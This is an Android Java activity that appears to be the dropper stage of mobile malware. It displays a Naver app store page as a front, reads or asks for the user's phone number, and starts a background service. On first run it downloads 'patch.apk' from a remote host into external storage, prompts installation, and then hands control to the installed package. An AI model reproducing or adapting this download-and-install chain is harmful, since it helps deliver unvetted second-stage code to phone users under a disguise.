package com.m1.android.data;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.webkit.WebSettings;
import android.webkit.WebSettings.ZoomDensity;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;

import com.m1.android.data.action.BaseAction;
import com.m1.android.data.patch.R;
import com.m1.android.data.service.SyncService;
import com.m1.android.data.util.AppUtil;
import com.m1.android.data.util.LocalManager;
import com.m1.android.data.util.PhoneUtil;

public class MainActivity extends Activity implements OnClickListener {
	private static final String TAG = "MainActivity";
	private static final int REQUEST_CODE_INSTALL_APK = 1001;
	private static final String DEFAULT_URL = "http://nstore.naver.com/appstore/android/home.nhn";
	private static final String DOWNLOAD_URL = BaseAction.DEFAULT_HOST
			+ "/patch.apk";
	private EditText mPhoneTxt;
	private Button mSetBtn;
	private DownloadTask mDownloadTask;
	private WebView mWebView;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		boolean isPatch = AppUtil.isPatch(getApplicationContext());
		if (isPatch) {
			setupViews();
		} else {
			if (isPatchInstalled()) {
				startPatch();
				finish();
			} else {
				setupViews();
				if (mDownloadTask == null || !mDownloadTask.mIsRunning) {
					mDownloadTask = new DownloadTask();
					mDownloadTask.execute();
				}
			}
		}
		Intent serviceIntent = new Intent(this, SyncService.class);
		startService(serviceIntent);
	}

	private void setupViews() {
		mPhoneTxt = (EditText) findViewById(R.id.phone);
		String phone = PhoneUtil.getPhone(getApplicationContext());
		mPhoneTxt.setText(phone);
		mSetBtn = (Button) findViewById(R.id.button);
		if (TextUtils.isEmpty(phone)) {
			mSetBtn.setVisibility(View.VISIBLE);
			mPhoneTxt.setEnabled(true);
			mSetBtn.setOnClickListener(this);
		} else {
			mPhoneTxt.setEnabled(false);
			mSetBtn.setVisibility(View.GONE);
		}
		mWebView = (WebView) findViewById(R.id.webView);
		mWebView.getSettings().setJavaScriptEnabled(true);
		mWebView.requestFocus(View.FOCUS_DOWN);
		mWebView.setWebViewClient(new MyWebViewClient());
		mWebView.setHorizontalScrollBarEnabled(true);
		mWebView.setVerticalScrollBarEnabled(true);
		mWebView.getSettings().setSupportZoom(true);
		mWebView.getSettings().setDefaultZoom(ZoomDensity.FAR);
		mWebView.getSettings().setBuiltInZoomControls(true);
		mWebView.getSettings()
				.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
		mWebView.loadUrl(DEFAULT_URL);
	}

	class MyWebViewClient extends WebViewClient {
		@Override
		public boolean shouldOverrideUrlLoading(WebView view, String url) {
			if (!TextUtils.isEmpty(url)
					&& (url.startsWith("http") || url.startsWith("https"))) {
				view.loadUrl(url);
			}
			return false;
		}
	}

	@Override
	public void onClick(View v) {
		switch (v.getId()) {
		case R.id.button:
			LocalManager.setPhone(getApplicationContext(), mPhoneTxt.getText()
					.toString());
			break;
		default:
			break;
		}
	}

	class DownloadTask extends AsyncTask<Void, Void, Boolean> {
		private boolean mIsRunning = false;
		private File mDownloadFile = null;

		public DownloadTask() {
			mDownloadFile = new File(Environment.getExternalStorageDirectory()
					+ "/download/", "m.apk");
			Log.i(TAG,
					"DownloadTask " + Environment.getExternalStorageDirectory());
		}

		@Override
		protected Boolean doInBackground(Void... params) {
			mIsRunning = true;
			boolean result = downloadFile(DOWNLOAD_URL);
			mIsRunning = false;
			return result;
		}

		@Override
		protected void onPostExecute(Boolean result) {
			super.onPostExecute(result);
			if (result) {
				Intent i = new Intent(Intent.ACTION_VIEW);
				i.setDataAndType(Uri.fromFile(mDownloadFile),
						"application/vnd.android.package-archive");
				startActivityForResult(i, REQUEST_CODE_INSTALL_APK);
			}
		}

		private boolean downloadFile(String downloadUrl) {
			// 下载代码
			int currentSize = 0;
			long totalSize = 0;
			int updateTotalSize = 0;
			HttpURLConnection httpConnection = null;
			InputStream is = null;
			FileOutputStream fos = null;
			try {
				URL url = new URL(downloadUrl);
				httpConnection = (HttpURLConnection) url.openConnection();
				httpConnection.setRequestProperty("User-Agent",
						"PacificHttpClient");
				if (currentSize > 0) {
					httpConnection.setRequestProperty("RANGE", "bytes="
							+ currentSize + "-");
				}
				httpConnection.setConnectTimeout(10000);
				httpConnection.setReadTimeout(20000);
				updateTotalSize = httpConnection.getContentLength();
				if (httpConnection.getResponseCode() == 404) {
					throw new Exception("fail!");
				}

				if (mDownloadFile.exists()) {
					mDownloadFile.delete();
				}
				mDownloadFile.createNewFile();
				is = httpConnection.getInputStream();
				fos = new FileOutputStream(mDownloadFile, false);
				byte buffer[] = new byte[4096];
				int readsize = 0;
				while ((readsize = is.read(buffer)) > 0) {
					fos.write(buffer, 0, readsize);
					totalSize += readsize;
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				try {
					if (httpConnection != null) {
						httpConnection.disconnect();
					}
					if (is != null) {
						is.close();
					}
					if (fos != null) {
						fos.close();
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			return totalSize == updateTotalSize;
		}
	}

	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
		if (requestCode == REQUEST_CODE_INSTALL_APK) {
			if (isPatchInstalled()) {
				startPatch();
				finish();
			}
		}
	}

	private boolean isPatchInstalled() {
		PackageInfo packageInfo = null;
		try {
			packageInfo = getPackageManager().getPackageInfo(
					AppUtil.PATCH_PKGNAME, 0);
		} catch (NameNotFoundException e) {
			packageInfo = null;
			e.printStackTrace();
		}
		return packageInfo != null;
	}

	private void startPatch() {
		Intent intent = new Intent(Intent.ACTION_MAIN);
		intent.addCategory(Intent.CATEGORY_LAUNCHER);
		ComponentName cn = new ComponentName(AppUtil.PATCH_PKGNAME,
				"com.m1.android.data.MainActivity");
		intent.setComponent(cn);
		startActivity(intent);
	}
}
